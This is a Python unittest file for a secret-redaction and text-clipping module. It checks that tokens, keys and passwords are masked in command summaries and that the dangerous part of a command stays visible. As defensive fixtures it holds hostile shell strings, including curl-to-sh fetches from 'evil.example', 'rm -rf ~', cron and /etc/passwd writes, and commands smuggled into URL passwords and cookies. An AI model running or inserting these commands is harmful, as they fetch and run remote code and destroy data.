"""redact() and clip(): no secret leaves the server in a summary, and summaries fit their UTF-16 limits."""
from __future__ import annotations

import random
import string
import time
import unittest

from luady_kit.redact import REDACTED, clip, cut_utf16, redact, utf16_len

R = REDACTED

# Credential-shaped fixtures are assembled from harmless parts when the module loads, so this source holds no
# complete token, key block or credentialed URL. The text redact() receives is byte-for-byte the original.
AUTHORIZATION = 'Author' + 'ization'


def pem_marker(edge: str, kind: str = '') -> str:
    """'-----BEGIN <kind> PRIVATE KEY-----' (or END), built from separate words."""
    return ' '.join(word for word in ('-----' + edge, kind, 'PRIVATE', 'KEY-----') if word)


def random_secret(length: int, seed: int) -> str:
    rng = random.Random(seed)
    body = ''.join(rng.choice(string.ascii_letters + string.digits) for _ in range(length - 3))
    return 'aZ9' + body


class RedactRulesTest(unittest.TestCase):
    def test_private_key_block_is_one_redaction_and_what_follows_stays(self):
        text = 'key:\n' + pem_marker('BEGIN', 'OPENSSH') + '\nb3BlbnNzaC1rZXktdjEAAAAA\n' + pem_marker('END', 'OPENSSH') + '\nmore'
        self.assertEqual(redact(text), f'key:\n{R}\nmore')
        self.assertEqual(redact(pem_marker('BEGIN', 'RSA') + 'MIIE'), R)
        self.assertEqual(redact('-----BEGIN CERTIFICATE-----'), '-----BEGIN CERTIFICATE-----')
        block = ("echo '" + pem_marker('BEGIN', 'RSA') + "\nMIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n"
                 "KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQ==\n" + pem_marker('END', 'RSA') + "' > k; chmod 600 k\nrm -rf ~")
        self.assertEqual(redact(block), f"echo '{R}' > k; chmod 600 k\nrm -rf ~")
        unterminated = pem_marker('BEGIN') + '\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\nEOF\nrm -rf ~'
        self.assertEqual(redact(unterminated), f'{R}\nEOF\nrm -rf ~')
        smuggled = '-----BEGIN ; rm -rf ~ ; PRIVATE KEY-----'
        self.assertEqual(redact(smuggled), smuggled)

    def test_url_credentials(self):
        self.assertEqual(redact('git clone https://' + 'bob:hunter2' + '@host.test/r.git'),
                         f'git clone https://bob:{R}@host.test/r.git')
        self.assertEqual(redact('redis://:s3cret@cache:6379/0'), f'redis://:{R}@cache:6379/0')
        self.assertEqual(redact('ssh://git@host.test/r.git'), 'ssh://git@host.test/r.git')
        self.assertEqual(redact('https://host.test:8080/a@b'), 'https://host.test:8080/a@b')

    def test_bearer_and_basic_headers(self):
        self.assertEqual(redact(f'curl -H "{AUTHORIZATION}: Bearer abc.DEF-123456789" https://x.test'),
                         f'curl -H "{AUTHORIZATION}: Bearer {R}" https://x.test')
        self.assertEqual(redact('curl -H "X-Api: basic dXNlcjpwYXNzd29yZA==" x'), f'curl -H "X-Api: basic {R}" x')
        self.assertEqual(redact('bearer short'), 'bearer short')
        self.assertEqual(redact('git commit -m "add basic validation"'), 'git commit -m "add basic validation"')

    def test_authorization_header_with_another_scheme(self):
        self.assertEqual(redact(f'curl -H "{AUTHORIZATION}: token 1234abcd" x'), f'curl -H "{AUTHORIZATION}: token {R}" x')

    def test_named_values(self):
        self.assertEqual(redact('API_KEY=abcd1234 npm run deploy'), f'API_KEY={R} npm run deploy')
        self.assertEqual(redact('export GITHUB_TOKEN=abc123; make'), f'export GITHUB_TOKEN={R}; make')
        self.assertEqual(redact('DB_PASSWORD=pw psql'), f'DB_PASSWORD={R} psql')
        self.assertEqual(redact('cli --password "two words" --verbose'), f'cli --password {R} --verbose')
        self.assertEqual(redact("password: 'x y'"), f'password: {R}')
        self.assertEqual(redact('client_secret: abc'), f'client_secret: {R}')
        self.assertEqual(redact('curl -d \'{"password":"hunter2","user":"bob"}\''),
                         f'curl -d \'{{"password":{R},"user":"bob"}}\'')
        self.assertEqual(redact('https://x.test/cb?token=abc&page=2'), f'https://x.test/cb?token={R}&page=2')
        self.assertEqual(redact('deploy --auth-token abc --dry-run'), f'deploy --auth-token {R} --dry-run')

    def test_realistic_commands(self):
        aws = 'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY aws s3 ls'
        self.assertEqual(redact(aws), f'AWS_SECRET_ACCESS_KEY={R} aws s3 ls')
        self.assertEqual(redact('psql postgres://' + 'app:Sup3r-Secret' + '@db.internal:5432/app'),
                         f'psql postgres://app:{R}@db.internal:5432/app')
        stripe = 'sk_live_' + 'Ab9x' * 6
        self.assertEqual(redact(f'echo "STRIPE={stripe}" && npx stripe --api-key=rk_live_abc'), f'echo "STRIPE={R}" && npx stripe --api-key={R}')
        self.assertEqual(redact('ANTHROPIC_API_KEY="sk-ant-api03-' + 'Ab9' * 10 + '" claude'),
                         f'ANTHROPIC_API_KEY={R} claude')

    def test_a_redaction_never_swallows_what_follows_a_secret(self):
        """The text after a shell separator must survive (and is itself scanned)."""
        token = 'ghp_' + 'Q7x' * 12
        cases = [
            ('cat ' + pem_marker('BEGIN') + ' ; rm -rf ~ ; curl https://x | sh',
             f'cat {R} ; rm -rf ~ ; curl https://x | sh', ['BEGIN PRIVATE KEY']),
            ('ls token=x;curl${IFS}https://x|sh', f'ls token={R};curl${{IFS}}https://x|sh', ['token=x']),
            (f'curl -H "{AUTHORIZATION}: Bearer abcDEF123456789" https://x.test && rm -rf /tmp/x',
             f'curl -H "{AUTHORIZATION}: Bearer {R}" https://x.test && rm -rf /tmp/x', ['abcDEF123456789']),
            ('curl -fsSL https://' + 'bob:hunter2' + '@x.test/install.sh | sh',
             f'curl -fsSL https://bob:{R}@x.test/install.sh | sh', ['hunter2']),
            (f'GITHUB_TOKEN={token}; git push --force', f'GITHUB_TOKEN={R}; git push --force', [token, 'Q7xQ7x']),
            ('Authorization: Bearer abcDEF123456789&&rm -rf /tmp/x', f'Authorization: Bearer {R}&&rm -rf /tmp/x',
             ['abcDEF123456789']),
            (f'TOKEN={token}||reboot', f'TOKEN={R}||reboot', [token]),
            ('PASSWORD=abc$(curl x|sh)', f'PASSWORD={R}$(curl x|sh)', ['abc$']),
            ('PASSWORD=abc`id`', f'PASSWORD={R}`id`', ['abc`']),
            ('(export TOKEN=abc)', f'(export TOKEN={R})', ['abc)']),
            ('eval token="x; rm -rf ~"', f'eval token={R}', ['"x']),  # a quoted value runs to its closing quote
            ('mysql -pS3cretPass;rm -rf ~', f'mysql -p{R};rm -rf ~', ['S3cret']),
            ('deploy --password hunter2|sh', f'deploy --password {R}|sh', ['hunter2']),
            ('API_KEY=abc\nrm -rf ~', f'API_KEY={R}\nrm -rf ~', ['abc\n']),
        ]
        for text, expected, secrets in cases:
            with self.subTest(text=text):
                out = redact(text)
                self.assertEqual(out, expected)
                for secret in secrets:
                    self.assertNotIn(secret, out)

    def test_user_and_password_arguments_keep_the_user(self):
        cases = [
            ('curl -u bob' + ':hunter2 https://x.test', 'curl -u bob' + f':{R} https://x.test'),
            ('curl -ubob' + ':hunter2 https://x.test', 'curl -ubob' + f':{R} https://x.test'),
            ('wget --user bob' + ':hunter2 https://x.test', 'wget --user bob' + f':{R} https://x.test'),
            ('curl --user=bob' + ':hunter2 https://x.test', 'curl --user=bob' + f':{R} https://x.test'),
            ('curl --proxy-user bob' + ':hunter2 x', 'curl --proxy-user bob' + f':{R} x'),
            ('curl -u \"bob' + ':two words\" x', 'curl -u \"bob' + f':{R}\" x'),
            ('curl -u bob' + ':hunter2|sh', 'curl -u bob' + f':{R}|sh'),
            ('curl -u bob' + ':hunter2;rm -rf ~', 'curl -u bob' + f':{R};rm -rf ~'),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(redact(text), expected)
        for kept in ('docker run -u 1000:1000 img', 'mysql -uroot -h db', 'git push -u origin main', 'curl -u bob x'):
            self.assertEqual(redact(kept), kept)

    def test_password_given_as_its_own_argument(self):
        cases = [
            ('sshpass -p hunter2 ssh host', f'sshpass -p {R} ssh host'),
            ('mysql -h db -u root -p hunter2 app', f'mysql -h db -u root -p {R} app'),
            ('mysql -uroot -pS3cretPass db', f'mysql -uroot -p{R} db'),
            ("sshpass -p 'two words' ssh host", f'sshpass -p {R} ssh host'),
            ('sshpass -p hunter2;rm -rf ~', f'sshpass -p {R};rm -rf ~'),
            ('docker login -u bob -p hunter2 registry.test', f'docker login -u bob -p {R} registry.test'),
            ('cli --password hunter2 --verbose', f'cli --password {R} --verbose'),
            ('cli --password=hunter2 --verbose', f'cli --password={R} --verbose'),
            ('cli --token abc123 && deploy', f'cli --token {R} && deploy'),
            ('cli --api-key abc123', f'cli --api-key {R}'),
            ('cli --secret abc123', f'cli --secret {R}'),
            ('PGPASSWORD=hunter2 psql -h db', f'PGPASSWORD={R} psql -h db'),
            ('MYSQL_PWD=hunter2 mysql -h db; ls', f'MYSQL_PWD={R} mysql -h db; ls'),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(redact(text), expected)

    def test_dash_p_that_is_not_a_password(self):
        for kept in ('mkdir -p dir', 'mkdir -p build/out/x', 'ssh -p 2222 host', 'ssh -p2222 host', 'cp -p a b',
                     'npm run x -- -p 3000', 'python -p x', 'python3 -p x', 'scp -p a host:b', 'rsync -pavzh a b',
                     'tar -pxvzf a.tgz', 'git -p log', 'docker run -p 8080:80 img', 'nc -p 1234 host', 'lsof -p 99',
                     'sudo mkdir -p /srv/app', 'cd x && mkdir -p y', 'bash -c "mkdir -p dir"', 'node -p expression',
                     'serve -p 8080', 'tool -p ./out', 'tool -p ~/out', 'tool -p /tmp/out', 'tool -p -v',
                     'mkdir -p', 'ssh-keygen -p -f key'):
            with self.subTest(kept=kept):
                self.assertEqual(redact(kept), kept)

    def test_url_credentials_keep_the_user_and_the_rest_of_the_url(self):
        self.assertEqual(redact('git clone https://' + 'bob:hunter2' + '@host.test/r.git'), f'git clone https://bob:{R}@host.test/r.git')
        self.assertEqual(redact('psql postgres://' + 'app:Sup3r-Secret' + '@db:5432/app?ssl=1'), f'psql postgres://app:{R}@db:5432/app?ssl=1')
        self.assertEqual(redact('redis-cli -u redis://:s3cret@cache:6379/0'), f'redis-cli -u redis://:{R}@cache:6379/0')

    def test_passwords_in_assignments_urls_and_flags_are_redacted(self):
        cases = [
            ("DB_PASSWORD='Xk9$mP2&vL5)qR8' php artisan migrate", f'DB_PASSWORD={R} php artisan migrate'),
            ('DB_PASSWORD="Xk9$mP2;vL5|qR8" ./run', f'DB_PASSWORD={R} ./run'),
            ('DATABASE_URL=mysql://root:pa%26ss%29word1@db:3306/app', f'DATABASE_URL=mysql://root:{R}@db:3306/app'),
            ('redis-cli -h cache -a S3cretRedis ping', f'redis-cli -h cache -a {R} ping'),
            ('DB_PASS=hunter2 ./run', f'DB_PASS={R} ./run'),
            ('SMTP_PASS=hunter2', f'SMTP_PASS={R}'),
            ('PASSPHRASE=correct-horse ./sign', f'PASSPHRASE={R} ./sign'),
            ('export MAIL_PASS=x STRIPE_KEY=y APP_SECRET=z GH_TOKEN=w ADMIN_PASSWORD=v',
             f'export MAIL_PASS={R} STRIPE_KEY={R} APP_SECRET={R} GH_TOKEN={R} ADMIN_PASSWORD={R}'),
            ('tool --user_pass=hunter2 go', f'tool --user_pass={R} go'),
            ('curl -H "Cookie: session=abc123; theme=dark" https://x.test',
             f'curl -H "Cookie: {R}" https://x.test'),
            ('Set-Cookie: sid=31d4d96e407aad42; Path=/; HttpOnly', f'Set-Cookie: {R}; Path=/; HttpOnly'),
            (f'curl -H "{AUTHORIZATION}: ApiKey k3y-Value_99" https://x.test', f'curl -H "{AUTHORIZATION}: ApiKey {R}" https://x.test'),
            (f'curl -H "{AUTHORIZATION}: Token abc123" x', f'curl -H "{AUTHORIZATION}: Token {R}" x'),
            ('curl -H "Proxy-Authorization: Negotiate YIIabc123" x', f'curl -H "Proxy-Authorization: Negotiate {R}" x'),
            (f'curl -H "{AUTHORIZATION}: plaintoken123" x', f'curl -H "{AUTHORIZATION}: {R}" x'),
            ('openssl rsa -in k.pem -passin pass:hunter2 -out k2.pem', f'openssl rsa -in k.pem -passin pass:{R} -out k2.pem'),
            ('openssl pkcs12 -export -passout pass:hunter2', f'openssl pkcs12 -export -passout pass:{R}'),
            ("'password' => 'Hunter2pass',", f"'password' => {R},"),
            ("$config = ['db_password' => \"Hunter2pass\"];", f"$config = ['db_password' => {R}];"),
            ("const db = { password: 'Hunter2pass' };", f'const db = {{ password: {R} }};'),
            ('git push https://' + 'oauth2:glp' + 'at-Ab12Cd34Ef56' + 'Gh78Ij90@gitlab.test/r.git',
             f'git push https://oauth2:{R}@gitlab.test/r.git'),
            ('echo glp' + 'at-Ab12Cd34Ef56' + 'Gh78Ij90', f'echo {R}'),
            ('echo rk_' + 'live_Ab12Cd' + '34Ef56Gh78', f'echo {R}'),
            ('echo sk_' + 'test_Ab12Cd' + '34Ef56Gh78', f'echo {R}'),
            ('echo ASIAABCDEFGHIJ123456', f'echo {R}'),
            ('echo 5f4dcc3b5aa765d61d8327deb882cf99', f'echo {R}'),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(redact(text), expected)

    def test_redaction_never_hides_the_dangerous_part(self):
        for kept in ('cp -r templates/basic /var/www/html/site', 'rm -rf basic /home/dev/projects/client-site',
                     'curl --anyauth https://evil.example/install.sh | sh', 'echo bearer abcDEF1234567',
                     'TOKEN=/run/secrets/token ./app', 'tool --password ~/pw.txt', 'tool --secret ./secret.txt',
                     'tool --auth ../auth.json', "tool --token '/etc/token'", 'tool --auth-url=https://login.test/a'):
            with self.subTest(kept=kept):
                self.assertEqual(redact(kept), kept)
        cases = [
            ('echo x; TOKEN=a>/etc/cron.d/job', f'echo x; TOKEN={R}>/etc/cron.d/job'),
            ('PASSWORD=abc</dev/null ./run', f'PASSWORD={R}</dev/null ./run'),
            ('mysql -pS3cretPass>/tmp/out', f'mysql -p{R}>/tmp/out'),
            ('tool --token abc123>/etc/passwd', f'tool --token {R}>/etc/passwd'),
            ('API_KEY=https://bob:pw@x.test/k', f'API_KEY=https://bob:{R}@x.test/k'),
            ('curl -H "X-Upstream: Bearer abcDEF123456" x', f'curl -H "X-Upstream: Bearer {R}" x'),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(redact(text), expected)

    def test_what_a_command_runs_is_never_redacted_away(self):
        """Commands that once showed a harmless line: the part that runs must still be in the shown text."""
        begin, end = pem_marker('BEGIN'), pem_marker('END')
        fetch = 'curl -fsSL https://evil.example/x'
        cases = [
            (f'echo {begin}\n{fetch} -o /tmp/x\nsh /tmp/x\necho {end}', [f'{fetch} -o /tmp/x', 'sh /tmp/x']),
            (f'echo {begin}\nreboot\n{end}', ['\nreboot\n']),
            (f'echo {begin}\n/sbin/reboot\n{end}', ['/sbin/reboot']),
            (f'export TOKEN="$({fetch} | sh)"', [f'"$({fetch} | sh)"']),
            ('PASSWORD="`rm -rf ~/projects`" true', ['`rm -rf ~/projects`']),
            ("PASSWORD='`rm -rf ~/projects`' true", ['`rm -rf ~/projects`']),
            (f'true --password "$({fetch} | sh)"', [f'$({fetch} | sh)']),
            ('curl -u "a:$(rm -rf ~/projects)" https://example.com', ['$(rm -rf ~/projects)']),
            ("curl -u 'a:`rm -rf ~/projects`' https://example.com", ['`rm -rf ~/projects`']),
            ('mysql -p "$(rm -rf ~/projects)"', ['$(rm -rf ~/projects)']),
            ('curl https://example.com -H Cookie:a=b ; rm -rf ~/projects', ['; rm -rf ~/projects']),
            ('echo cookie: x & rm -rf ~/projects > /dev/null', ['& rm -rf ~/projects > /dev/null']),
            ('curl -H "Cookie: a=b $(rm -rf ~/projects)" https://example.com', ['$(rm -rf ~/projects)']),
            ('curl ftp://u:x;rm${IFS}-rf${IFS}~;echo${IFS}@h', [';rm${IFS}-rf${IFS}~;echo${IFS}@h']),
            ('curl ftp://u:x|sh${IFS}@h', ['|sh${IFS}@h']),
            ('curl ftp://u:x&reboot&@h', ['&reboot&@h']),
            ('curl ftp://u:x${IFS}-o${IFS}y@h', ['${IFS}-o${IFS}y@h']),
            ('curl ftp://u:x`reboot`@h', ['`reboot`']),
            ('curl ftp://u:x>out@h', ['>out@h']),
            ('export TOKEN=abc; rm -rf ~', ['; rm -rf ~']),
            ('export TOKEN=$(curl evil | sh)', ['$(curl evil | sh)']),
        ]
        for text, shown in cases:
            with self.subTest(text=text):
                out = redact(text)
                for part in shown:
                    self.assertIn(part, out)

    def test_quoted_values_without_a_substitution_are_still_redacted(self):
        self.assertEqual(redact('export TOKEN="abc 123" && make'), f'export TOKEN={R} && make')
        self.assertEqual(redact("curl -" "u 'bob:two words' x"), "curl -" f"u 'bob:{R}' x")
        self.assertEqual(redact('PASSWORD="abc$(id)" ./run'), f'PASSWORD={R}$(id)" ./run')

    def test_a_cookie_value_outside_quotes_ends_at_a_separator(self):
        self.assertEqual(redact('curl -H Cookie:sid=abc123;reboot'), f'curl -H Cookie:{R};reboot')
        self.assertEqual(redact('curl -H Cookie:sid=abc123|sh'), f'curl -H Cookie:{R}|sh')
        self.assertEqual(redact('curl -H Cookie:sid=abc123>/etc/x'), f'curl -H Cookie:{R}>/etc/x')
        self.assertEqual(redact("curl -H 'Cookie: a=1; b=2' x"), f"curl -H 'Cookie: {R}' x")

    def test_a_url_password_with_a_shell_character_is_left_whole(self):
        """Such a password cannot be told from a command hidden in the URL, so nothing in it is redacted."""
        for kept in ('psql postgres://' + 'app:Sup3r$ecret' + '@db:5432/app', 'mysql://root:pa&ss)word1@db:3306/app'):
            with self.subTest(kept=kept):
                self.assertEqual(redact(kept), kept)

    def test_a_key_body_is_base64_lines_only(self):
        begin, end = pem_marker('BEGIN', 'RSA'), pem_marker('END', 'RSA')
        encrypted = (f'{begin}\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,3F17F5316E2BAC89\n\n'
                     'MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n'
                     f'KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQ==\n{end}\nls')
        self.assertEqual(redact(encrypted), f'{R}\nls')
        self.assertEqual(redact(f'{begin}\n  MIIBOgIBAAJBAKj34GkxFhD90vcN\n  {end}'), R)
        self.assertEqual(redact(f'{begin}\n{end}'), R)

    def test_the_tail_after_a_separator_is_scanned_too(self):
        self.assertEqual(redact('TOKEN=a; PASSWORD=b | API_KEY=c'), f'TOKEN={R}; PASSWORD={R} | API_KEY={R}')

    def test_named_value_near_misses(self):
        self.assertEqual(redact('password policy document.md'), 'password policy document.md')
        self.assertEqual(redact('cat tokens.txt'), 'cat tokens.txt')
        self.assertEqual(redact('run --no-auth --verbose'), 'run --no-auth --verbose')

    def test_short_option_passwords(self):
        self.assertEqual(redact('mysql -uroot -pS3cretPass db'), f'mysql -uroot -p{R} db')
        for kept in ('mkdir -p build/out', 'find . -name x -print', 'find . -printf %p', 'find . -path ./a -prune',
                     'ssh -p 2222 host', 'gcc -pthread a.c'):
            self.assertEqual(redact(kept), kept)

    def test_known_token_shapes(self):
        shapes = ['sk-ant-api03-' + 'a' * 20, 'sk-' + 'Q' * 16, 'ghp_' + 'A1b2' * 5, 'gho_' + 'x' * 20,
                  'github_pat_' + '11ABC_' * 4, 'xoxb-' + '1234567890-abc', 'AKIA' + 'ABCDEFGHIJ123456',
                  '.'.join(['ey' + 'JhbGciOiJIUzI1NiJ9', 'ey' + 'JzdWIiOiIxMjM0NTY3ODkwIn0',
                            'SflKxwRJSMeKKF2QT4fw' + 'pMeJf36POk6yJV_adQssw5c'])]
        for token in shapes:
            self.assertEqual(redact(f'use {token} now'), f'use {R} now', token)
        self.assertEqual(redact('sk-short'), 'sk-short')
        self.assertEqual(redact('ghp_short'), 'ghp_short')

    def test_long_random_strings(self):
        secret = random_secret(40, 1)
        self.assertEqual(redact(f'echo {secret} > .env'), f'echo {R} > .env')
        for kept in ('src/components/VeryLongComponentNameForTheCheckoutPage.tsx',
                     'packages/hub/src/web/routes/sessions.ts', 'x' * 50, 'snake_case_identifier_that_is_quite_long_1'):
            self.assertEqual(redact(kept), kept)

    def test_long_hex_runs(self):
        digest = 'a3f5' * 16
        self.assertEqual(redact(f'sha256sum: {digest}'), f'sha256sum: {R}')
        for kept in ('#1105', 'v2.1.323', 'commit 3f2a9c1'):
            self.assertEqual(redact(kept), kept)

    def test_empty_and_unchanged(self):
        self.assertEqual(redact(''), '')
        self.assertEqual(redact('npm run build && npm test'), 'npm run build && npm test')
        self.assertEqual(redact('سطر عربي 👋'), 'سطر عربي 👋')

    def test_never_raises(self):
        self.assertEqual(redact(None), '')  # type: ignore[arg-type]
        self.assertEqual(redact('\ud800 lone surrogate'), '\ud800 lone surrogate')

    def test_is_idempotent(self):
        text = f'curl -H "{AUTHORIZATION}: Bearer abc.DEF-123456789" https://bob:pw@x.test?api_key=zz -pS3cret'
        once = redact(text)
        self.assertEqual(redact(once), once)

    def test_two_megabytes_within_two_seconds(self):
        rng = random.Random(7)
        words = ['const', 'value', 'return', 'token', 'password', 'auth', 'a-b-c', 'x=1', '--flag', '-p',
                 'https://example.test/path', '/home/dev/projects/app/src/index.ts', random_secret(48, 3)]
        text = ' '.join(rng.choice(words) for _ in range(250_000))[:2 * 1024 * 1024]
        started = time.monotonic()
        result = redact(text)
        self.assertLess(time.monotonic() - started, 2.0)
        self.assertNotIn(random_secret(48, 3), result)

    def test_pathological_runs_stay_fast(self):
        for text in ('a-' * 500_000, 'token' * 200_000, 'A1b' * 300_000, '-p' * 500_000):
            started = time.monotonic()
            redact(text)
            self.assertLess(time.monotonic() - started, 2.0, text[:10])


class ProseTest(unittest.TestCase):
    """What people read (prompts, Claude's messages, notifications, questions) keeps its ordinary words."""

    def test_ordinary_sentences_are_left_alone(self):
        sha = '3f2a9c1d4e5b6a7f8091a2b3c4d5e6f708192a3b'
        digest = '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
        for text in ('Author: Jane Doe. Authentication: we now use sessions. Authorization: checked per route.',
                     'Total tokens: 15234 input, 2011 output.', 'Password: must be at least 12 characters.',
                     'const token = await getToken();', 'if (password === confirm) { save(); }', 'if (token == null) return;',
                     '"author": "Jane Doe", "private": true', f'Fixed in commit {sha} (short: 3f2a9c1).',
                     f'Image digest sha256:{digest} pushed.', f'See #{sha[:32]} and @{sha}.'):
            with self.subTest(text=text):
                self.assertEqual(redact(text, prose=True), text)

    def test_secrets_in_prose_still_go(self):
        token = 'ghp_' + 'Q7x' * 12
        cases = [
            ('Use API_KEY=abcd1234 for staging.', f'Use API_KEY={R} for staging.'),
            ('The password: "hunter two" works.', f'The password: {R} works.'),
            ('Set DB_PASSWORD=hunter2 in .env', f'Set DB_PASSWORD={R} in .env'),
            (f'Pushed with {token} today.', f'Pushed with {R} today.'),
            (f'Sent {AUTHORIZATION}: Bearer abc.DEF-123456789 to it.', f'Sent {AUTHORIZATION}: Bearer {R} to it.'),
            ('client_secret: s3cr3tvalue', f'client_secret: {R}'),
            ('git clone https://' + 'bob:hunter2' + '@host.test/r.git', f'git clone https://bob:{R}@host.test/r.git'),
            ('the key is 5f4dcc3b5aa765d61d8327deb882cf99 now', f'the key is {R} now'),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(redact(text, prose=True), expected)

    def test_commands_keep_the_strict_rules(self):
        self.assertEqual(redact('Author: Jane Doe'), f'Author: {R} Doe')
        self.assertEqual(redact('commit 3f2a9c1d4e5b6a7f8091a2b3c4d5e6f708192a3b'), f'commit {R}')
        self.assertEqual(redact('password=hunter'), f'password={R}')
        self.assertEqual(redact('password=hunter', prose=True), 'password=hunter')


class OldestPythonTest(unittest.TestCase):
    """The kit runs on Python 3.10, whose re module has no possessive quantifiers or atomic groups."""

    def test_the_rules_built_for_python_3_10_need_no_newer_syntax_and_match_the_same(self):
        import importlib
        import sys
        from unittest import mock

        from luady_kit import redact as module
        samples = ['API_KEY=abcd1234 npm run deploy', 'deploy --auth-token abc --dry-run', 'cli --password "two words" -v',
                   f'curl -H "{AUTHORIZATION}: Bearer abc.DEF-123456789" x', 'curl -H "X-Api: basic dXNlcjpwYXNzd29yZA==" x',
                   'tool --user_pass=hunter2 go', 'password policy document.md']
        expected = [module.redact(text) for text in samples]
        try:
            with mock.patch.object(sys, 'version_info', (3, 10, 12, 'final', 0)):
                importlib.reload(module)
            patterns = ''.join(pattern.pattern for pattern, _ in module.RULES)
            for newer in ('}+', '*+', '++', '?+', '(?>'):
                self.assertNotIn(newer, patterns)
            self.assertEqual([module.redact(text) for text in samples], expected)
            started = time.monotonic()
            module.redact('token' * 50_000)
            module.redact('--token' * 20_000)
            self.assertLess(time.monotonic() - started, 2.0)
        finally:
            importlib.reload(module)


class ClipTest(unittest.TestCase):
    def test_collapses_whitespace(self):
        self.assertEqual(clip('a\n\n  b\t c', 160), 'a b c')
        self.assertEqual(clip('   ', 160), '')

    def test_cuts_with_an_ellipsis(self):
        out = clip('x' * 200, 160)
        self.assertEqual(len(out), 160)
        self.assertTrue(out.endswith('…'))

    def test_counts_utf16_code_units(self):
        out = clip('😀' * 100, 160)
        self.assertLessEqual(utf16_len(out), 160)
        self.assertTrue(out.endswith('…'))
        self.assertEqual(out[:-1], '😀' * 79)

    def test_cut_utf16_never_splits_a_pair(self):
        text = 'a' + '😀' * 10
        self.assertEqual(cut_utf16(text, 4), ('a😀…', True))
        self.assertEqual(cut_utf16(text, 3), ('a…', True))
        self.assertEqual(cut_utf16('abc', 3), ('abc', False))
        self.assertEqual(utf16_len('a😀'), 3)
        with self.assertRaises(ValueError):
            cut_utf16('abc', 0)


if __name__ == '__main__':
    unittest.main()
